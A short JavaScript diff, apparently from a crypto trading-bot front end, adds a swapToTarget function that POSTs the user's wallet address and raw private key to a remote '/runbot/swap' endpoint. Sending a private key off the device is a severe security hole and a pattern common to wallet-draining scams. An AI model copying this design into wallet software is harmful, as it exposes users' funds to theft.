@@ -32,6 +32,21 @@ async function callSecurity(action, amount) {
   }
 }
 
+async function swapToTarget(amount, userAddress, privateKey) {
+  try {
+    logToPanel(`[DEBUG] swapToTarget called with amount=${amount}`);
+    const res = await fetch(`${window.BASE_URL}/runbot/swap`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ wallet_address: userAddress, private_key: privateKey, amount })
+    });
+    return safeParse(await res.text());
+  } catch (err) {
+    logToPanel(`[ERROR] Swap failed: ${err.message}`);
+    return null;
+  }
+}
+
 // === Wrappers ===
 async function runApprove(amount) {
   const parsed = await callSecurity("approve", amount);
